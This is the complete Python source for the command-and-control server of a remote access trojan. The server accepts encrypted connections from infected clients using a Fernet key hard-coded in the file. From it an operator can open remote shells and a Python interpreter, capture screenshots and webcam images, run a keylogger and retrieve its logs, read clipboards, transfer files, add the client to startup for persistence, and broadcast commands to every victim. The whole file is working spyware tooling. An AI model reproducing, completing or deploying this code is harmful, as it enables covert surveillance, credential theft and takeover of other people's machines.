""" Imports """
import json
import logging
import os
import platform
import socket
import sys
import threading
import traceback
from datetime import datetime
from typing import Tuple, Union
from queue import Empty, Queue, Full

from cryptography.fernet import Fernet

if platform.system() != 'Windows':
    # readline allows movement with arrowkeys on linux
    try:
        import readline
    except ImportError:
        pass

logging.basicConfig(level=logging.CRITICAL)

INTERFACE_HELP = """help | See this Help Message
shell | Open a shell
python | Open Remote Python Interpreter
screenshot | Grab a screenshot
webcam | Capture webcam
info | User Info
keylogger (start) (stop) (status) | Manage Keylogger
log | Returns log from client (includes keylogs)
send | Transfers file to Client
receive | Transfers file to Server
download | Download file from the web
zip (file) (dir) (unzip) | Zip Files or Folders
copy | Copies to Client Clipboard
paste | Returns Client Current Clipboard
startup (add) (remove) | Manage Startup (Windows)
client (lock) (shutdown) (restart) | Manage Client Machine (Windows)
session (restart) (disconnect) (close) | Manage Client Session
back | Run Connection in Background (or CTRL-C)"""

MENU_HELP = """help | See this Help Message
list | List connected Clients
open (ID) | Connect to a Client
broadcast | Broadcast command to all connected clients
shutdown | Shutdown Server"""


def read_file(path: str, block_size: int = 32768) -> bytes:
    """ Generator for reading files """
    with open(path, 'rb') as rb_file:
        while True:
            piece = rb_file.read(block_size)
            if piece:
                yield piece
            else:
                return


def errors(error: Exception, line: bool = True) -> str:
    """ Error Handler """
    error_class = error.__class__.__name__
    error_msg = f'{error_class}:'
    try:
        error_msg += f' {error.args[0]}'
    except Exception:
        pass
    if line:
        try:
            _, _, traceb = sys.exc_info()
            line_number = traceback.extract_tb(traceb)[-1][1]
            error_msg += f' (line {line_number})'
        except Exception:
            pass
    return error_msg


def shell_print(data: bytes) -> None:
    """ Support for printing more characters """
    # Mostly for tree command in Windows
    try:
        print(data.decode())
    except UnicodeDecodeError:
        try:
            print(data.decode('cp437'))
        except UnicodeDecodeError:
            print(data.decode(errors='replace'))


_time = lambda: f"{datetime.now()}".replace(':', '-')


class Client():
    """ Client Connection Object """

    def __init__(self, conn: socket.socket, address: list, fernet: Fernet) -> None:
        self.conn = conn
        self.address = address
        self.fernet = fernet

    def disconnect(self) -> None:
        """ Close client connection (allows reconnect) """
        self.conn.close()

    def recvall(self, byteamount: int) -> bytes:
        """ Function to receive n amount of bytes"""
        # returns bytes/None
        data = b''
        while len(data) < byteamount:
            data += self.conn.recv(byteamount - len(data))
        return data

    def receive(self) -> bytes:
        """ Receive Buffer Size and Data from Client """
        # returns bytes
        buffer = int(self.conn.recv(2048).decode())
        self.conn.send(b'RECEIVED')
        return self.fernet.decrypt(self.recvall(buffer))

    def send(self, data: bytes) -> None:
        """ Send Buffer Size and Data to Client """
        # returns None
        encrypted = self.fernet.encrypt(data)
        self.conn.send(f"{len(encrypted)}".encode())
        self.conn.recv(1024)
        self.conn.send(encrypted)

    def send_json(self, data: not bytes) -> None:
        """ Send JSON data to Client """
        self.send(json.dumps(data).encode())

    def recv_json(self) -> not bytes:
        """ Receive JSON data from Client """
        return json.loads(self.receive().decode())

    def is_frozen(self) -> bool:
        """ Check if the client is frozen (exe) """
        # returns bool
        self.send_json(['FROZEN'])
        return self.recv_json()

    def get_platform(self) -> str:
        """ Get Client Platform """
        # platform.system()
        self.send_json(['PLATFORM'])
        return self.receive().decode()

    def get_cwd(self) -> str:
        """ Get Client cwd """
        # returns cwd
        self.send_json(['GETCWD'])
        return self.receive().decode()

    def clipboard(self) -> Tuple[bool, str]:
        """ Get Client Clipboard """
        # returns True/False, clipboard/error
        self.send_json(['PASTE'])
        return tuple(self.recv_json())

    def fill_clipboard(self, data: str) -> Tuple[bool, Union[str, None]]:
        """ Copy to Client Clipboard"""
        # returns True/False, None/error
        self.send_json(['COPY', data])
        return tuple(self.recv_json())

    def download(self, url: str, file_name: str) -> Tuple[bool, Union[str, None]]:
        """ Download File To Client """
        # returns True/False, None/error
        self.send_json(['DOWNLOAD', url, file_name])
        return tuple(self.recv_json())

    def log_path(self) -> str:
        """ Get Log File Name"""
        self.send_json(['LOG_FILE'])
        return self.receive().decode()

    def get_log(self, save_as: str = None) -> str:
        """ Transfer log to Server """
        # save_as: file name
        if not save_as:
            save_as = f'{_time()}.log'
        log = self.log_path()
        self.receive_file(log, save_as)
        return save_as

    def restart_session(self) -> None:
        """ Restart Client Session """
        # returns None
        self.send_json(['RESTART_SESSION'])
        self.receive()

    def close(self) -> None:
        """ Stops client on target machine """
        # returns None
        self.send_json(['CLOSE'])
        self.receive()
        self.conn.close()

    def add_startup(self) -> Tuple[bool, Union[str, None]]:
        """ Add Client to Startup """
        # returns True/False, None/error
        self.send_json(['ADD_STARTUP'])
        return tuple(self.recv_json())

    def remove_startup(self) -> Tuple[bool, Union[str, None]]:
        """ Remove Client from Startup """
        # returns True/False, None/error
        self.send_json(['REMOVE_STARTUP'])
        return tuple(self.recv_json())

    def lock(self) -> bool:
        """ Lock Client Machine (Windows Only) """
        # Returns bool
        self.send_json(['LOCK'])
        return self.recv_json()

    def shutdown(self) -> None:
        """ Shutdown Client Machine """
        # returns None
        self.send_json(['SHUTDOWN'])
        return self.recv_json()

    def restart(self) -> None:
        """ Restart Client Machine """
        # returns None
        self.send_json(['RESTART'])
        return self.recv_json()

    def send_file(self, file_to_transfer: str, save_as: str) -> Tuple[bool, Union[str, None]]:
        """ Send file from Server to Client """
        # returns True/False, None/error
        if not os.path.isfile(file_to_transfer):
            return False, "FileNotFoundError"
        self.send_json(['SEND_FILE', save_as])
        if self.receive() == b'FILE_TRANSFER_ERROR':
            self.send(b'RECEIVED')
            return False, self.receive().decode()
        for block in read_file(file_to_transfer):
            self.send(block)
            self.receive()

        self.send(b'FILE_TRANSFER_DONE')
        self.receive()
        return True, None

    def receive_file(self, file_to_transfer: str, save_as: str) -> Tuple[bool, Union[str, None]]:
        """ Transfer file from Client to Server """
        # returns True/False, None/error
        self.send_json(['RECEIVE_FILE', file_to_transfer])
        with open(save_as, 'wb') as wb_file:
            while 1:
                data = self.receive()
                if data == b'FILE_TRANSFER_ERROR':
                    self.send(b'RECEIVED')
                    return False, self.receive().decode()
                if data == b'FILE_TRANSFER_DONE':
                    self.send(b'RECEIVED')
                    break
                wb_file.write(data)
                self.send(b'RECEIVED')
        self.receive()
        return True, None

    def screenshot(self, save_as: str = None) -> Tuple[bool, Union[str, None]]:
        """ Take screenshot on Client """
        # returns True/False, None/error
        if not save_as:
            save_as = f'{_time()}.png'
        self.send_json(['SCREENSHOT'])
        data = self.receive()
        if data == b'ERROR':
            self.send(b'RECEIVING')
            return False, self.receive()
        with open(save_as, 'wb') as _file:
            _file.write(data)
        return True, save_as

    def webcam(self, save_as: str = None) -> Tuple[bool, Union[str, None]]:
        """ Capture webcam """
        # returns True/False, save_as/None
        if not save_as:
            save_as = f'webcam-{_time()}.png'
        self.send_json(['WEBCAM'])
        data = self.receive()
        if data == b'ERROR':
            return False, None
        with open(save_as, 'wb') as _file:
            _file.write(data)
        return True, save_as

    def exec(self, command: str) -> Tuple[str, Union[str, None]]:
        """ Remote Python Interpreter """
        # returns command_output, error/None
        self.send_json(['EXEC', command])
        return tuple(self.recv_json())

    def shell(self, command: str, _print: bool = True) -> str:
        """ Remote Shell with Client """
        # returns command_output
        system = self.get_platform()
        split_command = command.split(' ')[0].strip().lower()
        if split_command in ['cd', 'chdir']:
            self.send_json(['SHELL', command])
            output = self.recv_json()
            if output[0] == 'ERROR':
                if _print:
                    print(output[1])
                return output[1]
            if system == 'Windows':
                if _print:
                    print()
                return '\n'
            return ''
        if split_command == 'cls' and system == 'Windows':
            os.system('cls')
            return ''
        if split_command == 'clear' and system != 'Windows':
            os.system('clear')
            return ''
        self.send_json(['SHELL', command])
        result = ''
        while 1:
            try:
                output = self.receive()
                if output == b'DONE':
                    break
                result += f"{output}\n"
                if _print:
                    shell_print(output)
                self.send_json(['LISTENING'])
            except (EOFError, KeyboardInterrupt):
                self.send(b'QUIT')
        return result

    def start_keylogger(self) -> bool:
        """ Start Keylogger """
        # returns True/False
        self.send_json(['START_KEYLOGGER'])
        return self.recv_json()

    def keylogger_status(self) -> bool:
        """ Get Keylogger Status """
        # returns True/False
        self.send_json(['KEYLOGGER_STATUS'])
        return self.recv_json()

    def stop_keylogger(self) -> bool:
        """ Stop Keylogger """
        # returns True/False
        self.send_json(['STOP_KEYLOGGER'])
        return self.recv_json()

    def get_info(self) -> Tuple[str]:
        """ Get Client Info """

        # returns (
        #     platform.system(),
        #     os.path.expanduser('~'),
        #     getpass.getlogin()
        # )

        self.send_json(['_INFO'])
        return tuple(self.recv_json())

    def info(self, _print: bool = True) -> str:
        """ Get Client Info """
        # returns str
        self.send_json(['INFO'])
        info = self.receive().decode()
        if _print:
            print(info)
        return info

    def zip_file(self, zip_filename: str, file_to_zip: str) -> Tuple[bool, Union[str, None]]:
        """ Zip a Single File """
        # returns True/False, None/error
        self.send_json(['ZIP_FILE', zip_filename, file_to_zip])
        return tuple(self.recv_json())

    def zip_dir(self, zip_filename: str, dir_to_zip: str) -> Tuple[bool, Union[str, None]]:
        """ Zip a Directory """
        # returns True/False, None/error
        self.send_json(['ZIP_DIR', os.path.splitext(zip_filename)[0], dir_to_zip])
        return tuple(self.recv_json())

    def unzip(self, zip_filename: str) -> Tuple[bool, Union[str, None]]:
        """ Unzip a File """
        # returns True/False, None/error
        self.send_json(['UNZIP', zip_filename])
        return tuple(self.recv_json())


class Server():
    """ Multi-connection Server class """

    def __init__(self, port: int, key: bytes) -> None:
        self.host = ''
        self.port = port
        self.socket = None
        self.thread = None
        self.event = threading.Event()
        self.queue = Queue(maxsize=10)
        self.fernet = Fernet(key)
        self.clients = []

    def _accept(self) -> None:
        """ Accepts incoming connections """
        while not self.event.is_set():
            try:
                conn, address = self.socket.accept()
                conn.setblocking(True)

                hostname = conn.recv(4096).decode()
                address = address + (hostname,)

                client = Client(conn, address, self.fernet)
                self.clients.append(client)
                try:
                    self.queue.put(client, block=False)
                except Full:
                    logging.info('Queue is full')
            except Exception as error:
                logging.debug(errors(error))

    def start(self) -> None:
        """ Start the Server """

        self.socket = socket.socket()
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        self.socket.bind((self.host, self.port))
        self.socket.listen(5)

        self.event.clear()

        self.thread = threading.Thread(target=self._accept)
        self.thread.daemon = True
        self.thread.start()

    def stop(self) -> None:
        """ Stop the server """

        if not self.event.is_set():
            self.event.set()
        self.socket.shutdown(socket.SHUT_RDWR)

    def disconnect(self, client: Client) -> None:
        """ Disconnect client and remove from connection list """
        try:
            self.clients.remove(client)
            client.disconnect()
        except Exception:
            pass

    def refresh(self) -> None:
        """ Refreshes connections """
        clients = self.clients[:]
        for client in clients:
            try:
                client.send_json(['LIST'])
                client.conn.recv(20480)
            except Exception:
                self.disconnect(client)


class ServerCLI(Server):
    """ CLI for the server """

    def __init__(self, key: bytes, port: int) -> None:
        Server.__init__(self, key, port)

        self._print_event = threading.Event()

        self.conn_thread = threading.Thread(target=self.__on_connection)
        self.conn_thread.daemon = True
        self.conn_thread.start()

    def __on_connection(self) -> None:
        """ Print message when a client connects """

        while not self._print_event.is_set():
            try:
                client = self.queue.get(timeout=3)
            except Empty:
                continue
            msg = f'Connection has been established: {client.address[0]} ({client.address[1]})'
            lines = len(msg)*'-'
            print(f'\n{lines}\n{msg}\n{lines}')
            self.queue.task_done()
        self._print_event.clear()

    def close(self) -> None:
        """ Close the CLI and shutdown the server """
        self._print_event.set()
        self.stop()

    def list_connections(self) -> None:
        """ List all connections """
        self.refresh()
        print('----- Clients -----')
        for i, client in enumerate(self.clients):
            print('   '.join(map(str, (i, ) + client.address)))

    def get_target(self, cmd: str) -> Client:
        """ Select target client """
        # returns Client Object
        target = cmd.split(' ')[-1]
        try:
            client = self.clients[int(target)]
        except (ValueError, IndexError):
            logging.error('Not a valid selection')
            return None
        print(f"You are now connected to {client.address[2]}")
        return client

    def python_interpreter(self, client: Client) -> None:
        """ Remote Python Interpreter CLI"""
        # returns None
        print('CAUTION! Using this feature wrong can break the client until restarted.')
        print('Tip: help("modules") lists available modules')
        while 1:
            command = input('>>> ')
            if command in ['exit', 'exit()']:
                break
            output, error = client.exec(command)
            if error is not None:
                print(error)
                continue
            if output != '':
                print(output, end='')

    def shell(self, client: Client) -> None:
        """ Remote Shell Interface """
        # returns None
        system, home, user = client.get_info()
        hostname = client.address[-1]

        while 1:
            cwd = client.get_cwd()
            if not system == 'Windows':
                cwd = cwd.replace(home, '~')
                _input = f'{user}@{hostname}:{cwd}$ '
            else:
                _input = f'{cwd}>'

            command = input(_input)
            if command.strip() == '':
                continue
            if command == 'exit':
                break
            client.shell(command)

    def selector(self, client: Client, command: str) -> Union[bool, None]:
        """ Command selector interface """
        # returns True/None
        commands = command.lower().split(' ')
        command = commands[0]
        select = commands[-1]
        if command == 'help':
            print(INTERFACE_HELP)
        elif command == 'shell':
            try:
                self.shell(client)
            except (EOFError, KeyboardInterrupt):
                print()
        elif command == 'python':
            try:
                self.python_interpreter(client)
            except (EOFError, KeyboardInterrupt):
                print()
        elif command == 'screenshot':
            print('Taking Screenshot...')
            result, error = client.screenshot()
            if result:
                print('Saved Screenshot.')
            else:
                print(f'Error Taking Screenshot: {error.decode()}')
        elif command == 'webcam':
            print('Accessing webcam...')
            result, _ = client.webcam()
            if result:
                print('Saved webcam image')
            else:
                print('Webcam Capture Error')
        elif command == 'info':
            client.info()
        elif command == 'keylogger':
            if select == 'start':
                if client.start_keylogger():
                    print('Started Keylogger')
                else:
                    print('Keylogger ImportError')
            elif select == 'status':
                if client.keylogger_status():
                    print('Keylogger Running')
                else:
                    print('Keylogger is not running.')
            elif select == 'stop':
                if client.stop_keylogger():
                    print('Stopped Keylogger')
                else:
                    print('Keylogger ImportError')
        elif command == 'log':
            print('Transferring log...')
            log = client.get_log()
            print(f'Log saved as: {log}')
        elif command == 'send':
            file_to_transfer = input('File to Transfer to Client: ')
            save_as = input('Save as: ')
            print('Transferring file...')
            result, error = client.send_file(file_to_transfer, save_as)
            if result:
                print('File transferred.')
            else:
                print(f'Error transferring file: {error}')
        elif command == 'receive':
            file_to_transfer = input('File to Transfer to Server: ')
            save_as = input('Save as: ')
            print('Transferring file...')
            result, error = client.receive_file(file_to_transfer, save_as)
            if result:
                print('File transferred.')
            else:
                print(f'Error transferring file: {error}')
        elif command == 'download':
            file_url = input('File URL: ')
            file_name = input('Filename: ')
            print('Downloading File...')
            result, error = client.download(file_url, file_name)
            if result:
                print('Downloaded file successfully')
            else:
                print(error)
        elif command == 'zip':
            if select == 'file':
                save_as = input('Zip Filename: ')
                file_to_zip = input('File to Zip: ')
                result, error = client.zip_file(save_as, file_to_zip)
                if result:
                    print('Zipping Successful.')
                else:
                    print(error)
            elif select == 'dir':
                save_as = input('Zip Filename: ')
                dir_to_zip = input('Directory to Zip: ')
                result, error = client.zip_dir(save_as, dir_to_zip)
                if result:
                    print('Zipped Directory Successfully.')
                else:
                    print(error)
            elif select == 'unzip':
                zip_filename = input('Zip File: ')
                result, error = client.unzip(zip_filename)
                if result:
                    print('Unzipped Successfully.')
                else:
                    print(error)
        elif command == 'copy':
            text_to_copy = input('Text to copy: ')
            result, error = client.fill_clipboard(text_to_copy)
            if result:
                print('Copied to Clipboard.')
            else:
                print(error)
        elif command == 'paste':
            _, output = client.clipboard()
            print(output)
        elif command == 'startup':
            if select == 'add':
                result, error = client.add_startup()
                if result:
                    print('Client added to Startup')
                else:
                    print(error)
            elif select == 'remove':
                result, error = client.remove_startup()
                if result:
                    print('Removed Client from Startup')
                else:
                    print(error)
        elif command == 'client':
            if select == 'lock':
                if client.lock():
                    print('Locked Client Machine')
                else:
                    print('Locking is only available on Windows.')
            elif select == 'shutdown':
                result = client.shutdown()
                if result:
                    print('Shutting down Client Machine')
                else:
                    print('Shutdown is only available on Windows.')
                return result
            elif select == 'restart':
                result = client.restart()
                if result:
                    print('Restarting Client Machine')
                else:
                    print('Restart is only available on Windows.')
                return result
        elif command == 'session':
            if select == 'restart':
                print('Restarting Session...')
                client.restart_session()
                self.refresh()
                return True
            elif select == 'disconnect':
                print('Disconnecting Client...')
                client.disconnect()
                self.refresh()
                return True
            elif select == 'close':
                print('Closing Client...')
                client.close()
                self.refresh()
                return True
        elif command == 'back':
            return True
        else:
            print("Invalid command: 'help' for help.")

    def broadcast(self, command: str) -> None:
        """ Broadcast a command to all connected Clients """
        # returns None
        clients = self.clients[:]
        for client in clients:
            try:
                print(f'Response from {client.address[0]}:')
                self.selector(client, command)
            except Exception as error:
                print(errors(error))

    def interface(self, client: Client) -> None:
        """ CLI to Client """
        # returns None
        ip_address = client.address[0]
        while True:
            command = input(f'{ip_address}> ')
            if self.selector(client, command):
                break

    def menu(self) -> None:
        """ Connection Selector """
        # returns None
        print("Type 'help' for help")
        while True:
            try:
                command = input('> ')
                if command == 'help':
                    print(MENU_HELP)
                elif command == 'broadcast':
                    self.broadcast(input('Command to broadcast: '))
                elif command == 'list':
                    self.list_connections()
                elif command[:4] == 'open':
                    client = self.get_target(command)
                    if client:
                        try:
                            self.interface(client)
                        except (EOFError, KeyboardInterrupt):
                            print()
                        except Exception as error:
                            print(f'Connection lost: {errors(error)}')
                            self.disconnect(client)
                            self.refresh()
                    else:
                        print('Invalid Selection.')
                elif command == 'shutdown':
                    raise EOFError
                else:
                    print("Invalid command: 'help' for help.")
            except (EOFError, KeyboardInterrupt):
                print('\nShutting down Server...')
                self.close()
                break
            except Exception as error:
                print(errors(error))


if __name__ == '__main__':
    server = ServerCLI(8000, b'QWGlyrAv32oSe_iEwo4SuJro_A_SEc_a8ZFk05Lsvkk=')
    server.start()
    server.menu()
